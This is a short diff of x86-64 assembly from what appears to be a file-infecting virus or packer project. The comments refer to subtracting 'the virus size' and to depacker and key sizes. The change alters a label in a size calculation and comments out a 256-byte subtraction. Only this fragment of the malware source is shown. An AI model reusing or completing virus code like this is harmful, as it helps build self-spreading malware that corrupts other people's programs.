@@ -218,12 +218,12 @@ _loop_verif:
 	sub QWORD [rsp + 56], r10 ; substract the virus size to our offset+size
 
 ; take depacker size + key_size
-	lea r10, [rel _decrypt]
+	lea r10, [rel _padding]
 	lea r11, [rel _end_decrypt]
 	add r11, 2
 	sub r11, r10
 	sub QWORD [rsp + 56], r11
-	sub QWORD [rsp + 56], 256
+;	sub QWORD [rsp + 56], 256
 
 _cmp_offset:
 	cmp QWORD [rsp + 56], 0
